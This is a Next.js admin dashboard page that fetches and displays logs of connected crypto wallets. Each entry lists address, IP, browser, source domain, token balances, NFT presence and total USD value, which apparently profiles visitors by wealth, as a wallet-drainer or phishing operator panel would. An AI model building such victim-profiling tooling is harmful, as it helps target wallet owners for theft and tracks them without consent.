// app/admin/page.tsx
'use client'; // This page is a Client Component to fetch data after mount

import { useState, useEffect } from 'react';

import Header from '@/components/layout/header';
import Footer from '@/components/layout/footer';
import { Button } from '@/components/ui/button';

interface WalletConnectionLog {
  id: string;
  timestamp: string;
  walletAddress: string;
  connectedWalletName: string;
  chainId: number;
  chainName: string;
  ipAddress?: string;
  domain: string;
  userAgent?: string;
  ethBalance?: string;
  tokens?: { symbol: string; amount: string; valueUsd: string }[];
  nftsDetected?: boolean;
  totalWalletValueUsd?: string;
}

export default function AdminDashboardPage() {
  const [logs, setLogs] = useState<WalletConnectionLog[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const fetchLogs = async () => {
      try {
        setLoading(true);
        setError(null);
        const response = await fetch('/api/log-connection'); // GET request to your API route
        if (!response.ok) {
          throw new Error(`Error fetching logs: ${response.statusText}`);
        }
        const data: WalletConnectionLog[] = await response.json();
        setLogs(data);
      } catch (err) {
        console.error('Failed to fetch admin logs:', err);
        setError('Failed to load logs. Please try again.');
      } finally {
        setLoading(false);
      }
    };

    fetchLogs();
    // You could also set up an interval to refresh logs automatically
    // const interval = setInterval(fetchLogs, 10000); // Refresh every 10 seconds
    // return () => clearInterval(interval); // Clean up interval on unmount
  }, []);

  return (
    <>
      <Header />
      <main className="container flex-grow py-12 md:py-24 lg:py-32">
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-4xl font-headline font-bold tracking-tighter sm:text-5xl text-primary">
            Admin Logs
          </h1>
          <Button onClick={() => window.location.reload()} variant="outline">
            Refresh Logs
          </Button>
        </div>

        {loading && <p className="text-center text-lg">Loading wallet connection logs...</p>}
        {error && <p className="text-center text-lg text-red-500">{error}</p>}

        {!loading && !error && logs.length === 0 && (
          <p className="text-center text-lg text-muted-foreground">No wallet connections logged yet.</p>
        )}

        {!loading && !error && logs.length > 0 && (
          <div className="space-y-6">
            {logs.map((log) => (
              <div key={log.id} className="bg-card p-6 rounded-lg shadow-md border">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <p><strong>User ID:</strong> {log.id}</p>
                    <p><strong>Connected Wallet:</strong> {log.connectedWalletName}</p>
                    <p><strong>Domain:</strong> {log.domain}</p>
                    <p><strong>IP:</strong> {log.ipAddress}</p>
                    <p><strong>OS/Browser:</strong> {log.userAgent}</p>
                    <p><strong>Connection Time:</strong> {new Date(log.timestamp).toLocaleString()}</p>
                  </div>
                  <div>
                    <p><strong>Address:</strong> <span className="font-mono text-sm break-all">{log.walletAddress}</span></p>
                    <p><strong>Chain:</strong> {log.chainName} (ID: {log.chainId})</p>
                    <p><strong>ETH/Native Balance:</strong> {log.ethBalance}</p>
                    <p><strong>Tokens:</strong> {log.tokens && log.tokens.length > 0 ? (
                      <ul>
                        {log.tokens.map((token, idx) => (
                          <li key={idx}>- {token.amount} {token.symbol} (${token.valueUsd})</li>
                        ))}
                      </ul>
                    ) : 'Not detected / Fetching...'}
                    </p>
                    <p><strong>NFTs:</strong> {log.nftsDetected ? 'Detected' : 'Not detected'}</p>
                    <p><strong>Total Value:</strong> ${log.totalWalletValueUsd}</p>
                    {log.walletAddress && (
                      <p className="mt-2">
                        <a
                          href={`https://etherscan.io/address/${log.walletAddress}`} // Adjust scanner URL for other chains if needed
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-500 hover:underline"
                        >
                          View wallet on scanner (Etherscan example)
                        </a>
                      </p>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
      <Footer />
    </>
  );
}